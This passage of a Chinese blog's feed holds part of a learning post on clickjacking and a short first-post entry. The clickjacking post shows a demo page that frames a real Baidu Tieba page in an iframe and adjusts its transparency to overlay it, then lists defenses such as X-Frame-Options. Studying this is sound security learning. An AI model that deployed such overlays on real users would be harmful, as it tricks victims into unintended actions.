class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">          简单测试</span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span>&gt;</span>查看详情<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"https://tieba.baidu.com/f?kw=%E8%AF%AD%E6%96%87"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li><p>页面B长这个样子</p><p><img src="/2019/09/10/点击劫持/1568081180449.png" alt="1568081180449"></p></li><li><p>页面A这个样子</p><p><img src="/2019/09/10/点击劫持/1568081252883.png" alt="1568081252883"></p></li><li><p>调整页面B中<code>&lt;iframe&gt;</code>的透明度，使我们能够同时看到页面A和页面B，然后如下图：</p><p><img src="/2019/09/10/点击劫持/Video_2019-09-10_101909.gif" alt="Video_2019-09-10_101909"></p></li></ol><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol><li>Javascript中禁止内嵌</li><li>X-FRAME-OPTIONS 防止内嵌</li><li>对于Firefox的用户，使用 NoScript 扩展</li></ol><p>参考链接：<br><a href="https://www.jianshu.com/p/8287c98492f3" target="_blank" rel="noopener">https://www.jianshu.com/p/8287c98492f3</a><br><a href="https://blog.csdn.net/qq_32523587/article/details/79613768" target="_blank" rel="noopener">https://blog.csdn.net/qq_32523587/article/details/79613768</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;百度解释：点击劫持，clickJacking，也被称为UI-覆盖攻击，它是通过覆盖不可见的框架误导受害者点击。&lt;/p&gt;
&lt;p&gt;虽然受害者点击的是他所看到的的网页，但其实他所点击的是被黑客精心构建的另一个置于原网页上面的透明页面。&lt;/p&gt;
&lt;p&gt;这种攻击利用了HTML中&lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt;标签的透明属性&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最近在复核漏洞的时候碰到了&lt;strong&gt;点击劫持&lt;/strong&gt;，由于以前没有看到过，所以简单记录一下(#^.^#)。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞学习" scheme="https://leonardo-o1.github.io/categories/漏洞学习/"/>
    
    
    <category term="web漏洞" scheme="https://leonardo-o1.github.io/tags/web漏洞/"/>
    
  </entry>
  
  <entry>
    <title>第一篇博客</title>
    <link href="https://leonardo-o1.github.io/2019/06/19/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
    <id>https://leonardo-o1.github.io/2019/06/19/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</id>
    <published>2019-06-19T15:03:52.000Z</published>
    <updated>2019-06-19T15:13:04.187Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下这次博客的搭建呀，嘻嘻。其实很久之前就想搭个博客了，一直没有开始（太懒了~）。也一直都想写写博客，随便写点什么的（希望能养成一个经常记录的习惯：））。</p><p>以后想到什么在来写吧。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;记录一下这次博客的搭建呀，嘻嘻。其实很久之前就想搭个博客了，一直没有开始（太懒了~）。也一直都想写写博客，随便写点什么的（希望能养成一个经常记录的习惯：））。&lt;/p&gt;
&lt;p&gt;以后想到什么在来写吧。。&lt;/p&gt;
</summary>
      
    
    
    
    <category term="杂记" scheme="https://leonardo-o1.github.io/categories/杂记/"/>
    
    
    <category term="记录" scheme="https://leonardo-o1.github.io/tags/记录/"/>
    
  </entry>
  
</feed>
